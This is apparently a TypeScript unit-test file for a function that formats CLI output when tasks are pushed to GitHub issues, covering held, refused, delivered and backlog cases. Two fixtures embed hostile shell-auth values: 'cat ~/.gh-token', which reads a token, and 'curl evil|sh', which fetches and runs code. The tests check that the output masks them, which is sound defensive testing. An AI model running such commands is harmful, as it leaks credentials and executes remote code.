import { asIsoDateStamp } from 'iso-time';
import { given, then, when } from 'test-fns';

import { RadioChannel } from '@src/domain.objects/RadioChannel';
import { RadioTask } from '@src/domain.objects/RadioTask';
import { RadioTaskRecord } from '@src/domain.objects/RadioTaskRecord';
import { RadioTaskRecordStatus } from '@src/domain.objects/RadioTaskRecordStatus';
import { RadioTaskRepo } from '@src/domain.objects/RadioTaskRepo';
import { RadioTaskStatus } from '@src/domain.objects/RadioTaskStatus';

import { asRadioPushOutput } from './asRadioPushOutput';

const repo = new RadioTaskRepo({ owner: 'ehmpathy', name: 'rhachet' });
const repoShut = new RadioTaskRepo({
  owner: 'sandpine',
  name: 'svc-reservations',
});

const genRecord = (input: Partial<RadioTaskRecord>): RadioTaskRecord =>
  new RadioTaskRecord({
    key: 'f0e1d2c3b4a59687',
    kind: 'create',
    repo,
    via: RadioChannel.GH_ISSUES,
    auth: null,
    idem: null,
    title: 'fix flaky keyrack test',
    description: 'the test flakes',
    exid: null,
    status: null,
    recordStatus: RadioTaskRecordStatus.QUEUED,
    reason: null,
    heldSeq: 1,
    deliveredExid: null,
    ...input,
  });

const genTask = (input: { exid: string; title: string }): RadioTask =>
  new RadioTask({
    ...input,
    description: 'the test flakes',
    status: RadioTaskStatus.QUEUED,
    repo,
    pushedBy: 'seaturtle',
    pushedAt: asIsoDateStamp('2026-09-29'),
    claimedBy: null,
    claimedAt: null,
    deliveredAt: null,
    branch: null,
  });

const homeRoute = {
  dir: '.behavior/v2026_09_28.fix-radio-recorder/.radio',
  place: 'route' as const,
  binds: ['.behavior/v2026_09_28.fix-radio-recorder'],
};

describe('asRadioPushOutput', () => {
  given('[case1] an open push with no backlog (C1)', () => {
    when('[t0] the push is delivered', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'delivered',
          record: genRecord({
            recordStatus: RadioTaskRecordStatus.DELIVERED,
            deliveredExid: '414',
          }),
          task: genTask({ exid: '414', title: 'fix flaky keyrack test' }),
          outcome: 'created',
        },
        others: [],
        home: homeRoute,
        backlog: 0,
      });

      then('it reads as today, plus where it was recorded', () => {
        expect(output).toContain('🦫 onto the pile!');
        expect(output).toContain(`recorded: ${homeRoute.dir}/`);
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case2] a push blocked by radio.uses (C10)', () => {
    when('[t0] the push is held with one other held', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'held',
          record: genRecord({ reason: 'radio.uses:blocked — global' }),
          lift: 'rhx radio.uses --global allow',
          detail: null,
          halt: false,
        },
        others: [],
        home: homeRoute,
        backlog: 2,
      });

      then('it leads with held, the reason, the backlog, and the lift', () => {
        expect(output).toContain('🦫 held for the radio');
        expect(output).toContain('QUEUED (radio.uses:blocked — global)');
        expect(output).toContain('backlog = 2 await the radio');
        expect(output).toContain(
          'lift it (human): rhx radio.uses --global allow',
        );
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case3] an unbound push held by an upstream fault (R2, C13)', () => {
    when('[t0] the token was rejected', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'held',
          record: genRecord({ reason: 'upstream:401' }),
          lift: null,
          detail:
            'github auth failed: the robot token was rejected by github (401)\n  • unblock now — re-run as human: --auth as-human',
          halt: true,
        },
        others: [],
        home: { dir: '.behavior/.radio', place: 'unbound', binds: [] },
        backlog: 1,
      });

      then('it names the place and the fix', () => {
        expect(output).toContain('(no route bound to this branch)');
        expect(output).toContain('fix it: github auth failed');
        expect(output).toMatchSnapshot();
      });
    });

    when('[t1] the branch is bound to two routes (R3)', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'held',
          record: genRecord({ reason: 'radio.uses:blocked — default' }),
          lift: 'rhx radio.uses allow',
          detail: null,
          halt: false,
        },
        others: [],
        home: {
          dir: '.behavior/.radio',
          place: 'multibound',
          binds: ['.behavior/v2026_01_01.alpha', '.behavior/v2026_01_02.beta'],
        },
        backlog: 1,
      });

      then('it names the place and both binds', () => {
        expect(output).toContain(
          'held at = .behavior/.radio/ (branch bound to 2 routes: .behavior/v2026_01_01.alpha, .behavior/v2026_01_02.beta)',
        );
        expect(output).toMatchSnapshot();
      });
    });

    when('[t2] the fault hint carries its own tree', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'held',
          record: genRecord({ reason: 'upstream:auth' }),
          lift: null,
          detail: [
            'unrecognized --auth mode: some-unknown-mode',
            '',
            'supported modes:',
            '├─ as-robot:env(VAR)',
            '│     use token from environment variable',
            '└─ as-human',
            '      use gh cli logged-in session (interactive)',
          ].join('\n'),
          halt: true,
        },
        others: [],
        home: { dir: '.behavior/.radio', place: 'unbound', binds: [] },
        backlog: 1,
      });

      then(
        'the inner tree nests under its header, with no second glyph per line',
        () => {
          expect(output).not.toContain('├─ ├─');
          expect(output).not.toContain('├─ │');
          expect(output).toContain('│  ├─ as-robot:env(VAR)');
          expect(output).toContain(
            '│        use gh cli logged-in session (interactive)',
          );
          expect(output).toMatchSnapshot();
        },
      );
    });
  });

  given('[case3.4] a push held with no fault detail, the gate open', () => {
    when('[t0] its record carries a reason but no detail', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'held',
          record: genRecord({ reason: 'upstream:access' }),
          lift: null,
          detail: null,
          halt: false,
        },
        others: [],
        home: homeRoute,
        backlog: 1,
      });

      then('the fix line names the reason, never null', () => {
        expect(output).toContain('fix it: upstream:access');
        expect(output).not.toContain('null');
        expect(output).toMatchSnapshot();
      });
    });

    when('[t1] its record carries no reason at all', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'held',
          record: genRecord({ reason: null }),
          lift: null,
          detail: null,
          halt: false,
        },
        others: [],
        home: homeRoute,
        backlog: 1,
      });

      then('it says naught to fix, never `fix it: null`', () => {
        expect(output).toContain('naught to fix: no fault on record');
        expect(output).not.toContain('fix it:');
        expect(output).not.toContain('null');
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case3.2] a push held behind an earlier update to its issue', () => {
    when('[t0] the record ahead is set aside in the same drain', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'held',
          record: genRecord({
            key: 'b1b2c3d4e5f60718',
            kind: 'update',
            title: null,
            exid: '599',
            status: RadioTaskStatus.DELIVERED,
            reason: 'behind:a1b2c3d4e5f60718 (same issue #599)',
          }),
          lift: null,
          detail:
            'behind claim #599 on the same issue: unsent, sends once it lands or is dropped',
          halt: false,
        },
        others: [
          {
            fate: 'held',
            record: genRecord({
              key: 'a1b2c3d4e5f60718',
              kind: 'update',
              title: null,
              exid: '599',
              status: RadioTaskStatus.CLAIMED,
              reason: 'upstream:access',
            }),
            lift: null,
            detail:
              'GraphQL: Resource not accessible by integration (updateIssue)',
            halt: false,
          },
        ],
        home: homeRoute,
        backlog: 2,
      });

      then(
        'it points to the record ahead, and promises a send only once that one lands or is dropped',
        () => {
          expect(output).toContain(
            'fix the earlier update first: --uuid a1b2c3d4e5f60718',
          );
          expect(output).toContain('see its fix: rhx radio.task.queue get');
          // the wait is named once, on the status line
          expect(output!.match(/waits behind a1b2c3d4e5f60718/g)).toHaveLength(
            1,
          );
          expect(output).not.toContain('fix it:');
          expect(output).not.toContain(
            'then the next push delivers the backlog first',
          );
          expect(output).toMatchSnapshot();
        },
      );
    });
  });

  given('[case3.3] a push held behind a halt, never sent itself', () => {
    when('[t0] an earlier record in the drain hit a rate limit', () => {
      const output = asRadioPushOutput({
        pushed: {
          fate: 'held',
          record: genRecord({ reason: 'upstream:rate-limit' }),
          lift: null,
          detail:
            '💥 MalfunctionError: Command failed: gh issue list --repo sandpine/svc-rentals --state all',
          halt: false,
        },
        others: [
          {
            fate: 'held',
            record: genRecord({
              key: 'a1b2c3d4e5f60718',
              title: 'wetsuit sizes',
              reason: 'upstream:rate-limit',
            }),
            lift: null,
            detail: 'API rate limit exceeded for installation ID 1',
            halt: true,
          },
        ],
        home: homeRoute,
        backlog: 2,
      });

      then('it names the wait, never the wall fault it never met', () => {
        expect(output).toContain(
          'waits behind the halt (upstream:rate-limit): unsent, still in line',
        );
        expect(output).toContain('wait, then: rhx radio.task.queue drain');
        expect(output).not.toContain('fix it:');
        expect(output).not.toContain('Command failed');
        expect(output).toMatchSnapshot();
      });
    });
  });

  given('[case3.1] a delivered record that lacks its exid', () => {
    when('[t0] the output renders', () => {
      then('it fails loud, never prints #null', () => {
        expect(() =>
          asRadioPushOutput({
            pushed: {
              fate: 'landed',
              record: genRecord({
                recordStatus: RadioTaskRecordStatus.DELIVERED,
                deliveredExid: null,
              }),
            },
            others: [],
            home: homeRoute,
            backlog: 0,
          }),
        ).toThrow('delivered radio task record lacks its exid');
      });
    });
  });

  given('[case4] an open push that drains a backlog (C4, C20, U3)', () => {
    when(
      '[t0] one drains, one is refused, one stays held behind a shut org',
      () => {
        const output = asRadioPushOutput({
          pushed: {
            fate: 'delivered',
            record: genRecord({
              key: 'new',
              title: 'retry race in route.bounce',
              recordStatus: RadioTaskRecordStatus.DELIVERED,
              deliveredExid: '415',
            }),
            task: genTask({ exid: '415', title: 'retry race in route.bounce' }),
            outcome: 'created',
          },
          others: [
            {
              fate: 'delivered',
              record: genRecord({
                key: 'a',
                recordStatus: RadioTaskRecordStatus.DELIVERED,
                deliveredExid: '412',
              }),
              task: genTask({ exid: '412', title: 'fix flaky keyrack test' }),
              outcome: 'created',
            },
            {
              fate: 'refused',
              record: genRecord({
                key: 'b',
                kind: 'update',
                title: null,
                exid: '411',
                status: RadioTaskStatus.CLAIMED,
                recordStatus: RadioTaskRecordStatus.REFUSED,
              }),
              detail: 'task already claimed by different branch',
            },
            {
              fate: 'held',
              record: genRecord({
                key: 'c3c3c3c3c3c3c3c3',
                repo: repoShut,
                title: 'guard gateway',
                reason: 'radio.uses:blocked — org',
              }),
              lift: 'rhx radio.uses --org sandpine allow',
              detail: null,
              halt: false,
            },
          ],
          home: homeRoute,
          backlog: 1,
        });

        then(
          'it lists drained, pushed, refused, still held, and the backlog',
          () => {
            expect(output).toContain(
              '🦫 back in the river! part of the backlog is delivered',
            );
            expect(output).not.toContain('river! the backlog is delivered');
            expect(output).toContain('#412 fix flaky keyrack test');
            // a carried record refused is named here, the one place it shows; get will not recall it
            expect(output).toContain(
              'rhx radio.task.queue get lists it no more, and its reason stays in its record file',
            );
            expect(output).toContain(
              '#415 retry race in route.bounce (created)',
            );
            expect(output).toContain(
              'claim #411 — task already claimed by different branch',
            );
            expect(output).toContain(
              'guard gateway → sandpine/svc-reservations (radio.uses:blocked — org)',
            );
            expect(output).toMatchSnapshot();
          },
        );
      },
    );
  });

  given(
    '[case5] a delivered push re-pushed while the gate is shut (C9)',
    () => {
      when('[t0] the record already landed', () => {
        const output = asRadioPushOutput({
          pushed: {
            fate: 'landed',
            record: genRecord({
              recordStatus: RadioTaskRecordStatus.DELIVERED,
              deliveredExid: '412',
            }),
          },
          others: [],
          home: homeRoute,
          backlog: 0,
        });

        then('it says already delivered, with the exid', () => {
          expect(output).toContain('🦫 already delivered');
          expect(output).toContain('exid    = #412');
          expect(output).toMatchSnapshot();
        });
      });
    },
  );

  given(
    '[case6] a held claim replays onto a task claimed elsewhere (U3)',
    () => {
      when('[t0] the push itself is refused', () => {
        const output = asRadioPushOutput({
          pushed: {
            fate: 'refused',
            record: genRecord({
              kind: 'update',
              title: null,
              exid: '412',
              status: RadioTaskStatus.CLAIMED,
              recordStatus: RadioTaskRecordStatus.REFUSED,
            }),
            detail: 'task already claimed by different branch',
          },
          others: [],
          home: homeRoute,
          backlog: 0,
        });

        then('it reads refused, closed, never retried', () => {
          expect(output).toContain('🦫 refused upstream');
          expect(output).toContain('closed, never retried');
          expect(output).toMatchSnapshot();
        });
      });
    },
  );

  given(
    '[case7] a delivered push re-pushed through an open gate, with a backlog (C3, C6, case=4 t0)',
    () => {
      when('[t0] the backlog drains; one record had lost its mark', () => {
        const output = asRadioPushOutput({
          pushed: {
            fate: 'landed',
            record: genRecord({
              recordStatus: RadioTaskRecordStatus.DELIVERED,
              deliveredExid: '412',
            }),
          },
          others: [
            {
              fate: 'delivered',
              record: genRecord({
                key: 'lost',
                title: 'guard absent sponsor',
                recordStatus: RadioTaskRecordStatus.DELIVERED,
                deliveredExid: '413',
              }),
              task: genTask({ exid: '413', title: 'guard absent sponsor' }),
              outcome: 'found',
            },
          ],
          home: homeRoute,
          backlog: 0,
        });

        then(
          'it says already delivered, and lists the drained backlog, the lost mark named',
          () => {
            expect(output).toContain('🦫 already delivered');
            expect(output).toContain('exid    = #412');
            expect(output).toContain(
              '#413 guard absent sponsor (already upstream — marked delivered)',
            );
            expect(output).toContain('backlog = 0');
            expect(output).toMatchSnapshot();
          },
        );
      });
    },
  );

  given(
    '[case8] a refused push through an open gate, with a backlog behind it (U3, C4)',
    () => {
      when('[t0] the push is refused; one drains, one stays held', () => {
        const output = asRadioPushOutput({
          pushed: {
            fate: 'refused',
            record: genRecord({
              kind: 'update',
              title: null,
              exid: '411',
              status: RadioTaskStatus.CLAIMED,
              recordStatus: RadioTaskRecordStatus.REFUSED,
            }),
            detail: 'task already claimed by different branch',
          },
          others: [
            {
              fate: 'delivered',
              record: genRecord({
                key: 'a',
                recordStatus: RadioTaskRecordStatus.DELIVERED,
                deliveredExid: '412',
              }),
              task: genTask({ exid: '412', title: 'fix flaky keyrack test' }),
              outcome: 'created',
            },
            {
              fate: 'held',
              record: genRecord({
                key: 'c3c3c3c3c3c3c3c3',
                repo: repoShut,
                title: 'guard gateway',
                reason: 'radio.uses:blocked — org',
              }),
              lift: 'rhx radio.uses --org sandpine allow',
              detail: null,
              halt: false,
            },
          ],
          home: homeRoute,
          backlog: 1,
        });

        then(
          'it reads refused, and lists the drained, the still held, and the backlog',
          () => {
            expect(output).toContain('🦫 refused upstream');
            expect(output).toContain('closed, never retried');
            expect(output).toContain('#412 fix flaky keyrack test');
            expect(output).toContain(
              'guard gateway → sandpine/svc-reservations (radio.uses:blocked — org)',
            );
            expect(output).toContain('backlog = 1');
            expect(output).toMatchSnapshot();
          },
        );
      });
    },
  );

  given(
    '[case20] a push held at a shut gate, under an auth no drain will replay',
    () => {
      when('[t0] the hold renders', () => {
        const output = asRadioPushOutput({
          pushed: {
            fate: 'held',
            record: genRecord({
              repo: repoShut,
              auth: 'as-robot:shx(cat ~/.gh-token)',
              reason: 'radio.uses:blocked — org',
            }),
            lift: 'rhx radio.uses --org sandpine allow',
            detail: null,
            halt: false,
          },
          others: [],
          home: homeRoute,
          backlog: 1,
        });

        then(
          'it names two human acts side by side, the lift and an auth amend with a placeholder auth',
          () => {
            expect(output).toContain(
              '├─ lift it (human): rhx radio.uses --org sandpine allow',
            );
            // the amend is a peer of the lift, never a step of it
            expect(output).toContain(
              '└─ amend its auth (human): rhx radio.task.queue set --uuid f0e1d2c3b4a59687 --auth <auth>',
            );
            // the auth it fixes rides beneath it, masked; the warn is said once
            expect(output).toContain(
              '└─ auth: as-robot:shx(…), will not replay',
            );
            expect(output!.match(/will not replay/g)).toHaveLength(1);
            expect(output).not.toContain('you type');
            expect(output).not.toContain('gh-token');
            expect(output).not.toContain('the next push delivers');
            expect(output).toContain('backlog = 1 awaits the radio');
            expect(output).toMatchSnapshot();
          },
        );
      });
    },
  );

  given(
    '[case21] a push held at a shut gate, its record merged in with a planted shell auth (r10 blocker.1)',
    () => {
      when('[t0] the hold renders', () => {
        const output = asRadioPushOutput({
          pushed: {
            fate: 'held',
            record: genRecord({
              repo: repoShut,
              auth: 'as-robot:shx(curl evil|sh)',
              reason: 'radio.uses:blocked — org',
            }),
            lift: 'rhx radio.uses --org sandpine allow',
            detail: null,
            halt: false,
          },
          others: [],
          home: homeRoute,
          backlog: 2,
        });

        then('no line carries the planted command', () => {
          expect(output).not.toContain('curl evil');
          expect(output).toContain('--auth <auth>');
          expect(output).toContain('backlog = 2 await the radio');
        });
      });
    },
  );
});
